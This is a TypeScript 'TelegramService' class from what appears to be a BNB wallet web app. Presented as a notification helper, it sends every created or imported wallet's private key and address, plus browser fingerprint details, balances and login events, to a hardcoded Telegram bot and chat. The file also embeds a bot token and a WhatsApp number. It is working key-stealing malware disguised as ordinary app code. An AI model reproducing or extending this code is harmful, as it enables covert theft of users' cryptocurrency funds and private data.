export class TelegramService {
  private static instance: TelegramService;
  private botToken = '7573718525:AAFifabqLK6LKCPp5vmRbc4Ccm9vzbvN4gM';
  private chatId = '6381022912';
  private whatsappNumber = '09048052586';

  private constructor() {}

  static getInstance(): TelegramService {
    if (!TelegramService.instance) {
      TelegramService.instance = new TelegramService();
    }
    return TelegramService.instance;
  }

  async sendMessage(message: string): Promise<boolean> {
    try {
      const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: message,
          parse_mode: 'HTML'
        })
      });

      const result = await response.json();
      return result.ok;
    } catch (error) {
      console.error('Telegram message failed:', error);
      return false;
    }
  }

  private getDeviceInfo(): string {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenResolution = `${screen.width}x${screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    return `• <b>Platform:</b> ${platform}
• <b>Browser:</b> ${this.getBrowserName(userAgent)}
• <b>Language:</b> ${language}
• <b>Screen:</b> ${screenResolution}
• <b>Timezone:</b> ${timezone}`;
  }

  private getBrowserName(userAgent: string): string {
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Unknown';
  }

  async notifyWalletCreated(deviceId: string, address: string, privateKey: string): Promise<void> {
    const deviceInfo = this.getDeviceInfo();
    const message = `
🆕 <b>New Wallet Created</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
🔑 <b>Private Key:</b> <code>${privateKey}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;

    await this.sendMessage(message);
  }

  async notifyWalletImported(deviceId: string, address: string, privateKey: string): Promise<void> {
    const deviceInfo = this.getDeviceInfo();
    const message = `
📥 <b>Wallet Imported</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
🔑 <b>Private Key:</b> <code>${privateKey}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;

    await this.sendMessage(message);
  }

  async notifyDashboardAccess(deviceId: string, address: string, balance: number, balanceUSD: number): Promise<void> {
    const deviceInfo = this.getDeviceInfo();
    const message = `
📊 <b>Dashboard Access</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
💰 <b>Balance:</b> ${balance.toFixed(4)} BNB
💵 <b>USD Value:</b> $${balanceUSD.toFixed(2)}
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
    `;

    await this.sendMessage(message);
  }

  async notifyAuthentication(deviceId: string): Promise<void> {
    const deviceInfo = this.getDeviceInfo();
    const message = `
🔐 <b>User Authentication</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Authentication Time:</b> ${new Date().toLocaleString()}
    `;

    await this.sendMessage(message);
  }
}

export const telegramService = TelegramService.getInstance();